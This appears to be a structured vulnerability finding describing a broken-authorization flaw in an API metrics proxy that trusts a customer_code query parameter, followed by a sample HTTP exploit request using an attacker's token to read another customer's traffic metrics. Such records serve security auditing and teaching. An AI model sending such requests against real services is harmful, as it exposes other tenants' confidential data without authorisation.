diagnosis: The API metrics proxy executes PromQL queries against an internal Prometheus instance using customer_code from query parameters. Because it does not verify that current_user is affiliated with customer_code, any authenticated caller can probe competitor API query rates and traffic volume.
exploit_request:
GET /analytics/api-usage-metrics?customer_code=CUST_APEX_GLOBAL HTTP/1.1
Host: api.platform.io
Authorization: Bearer <attacker_jwt>
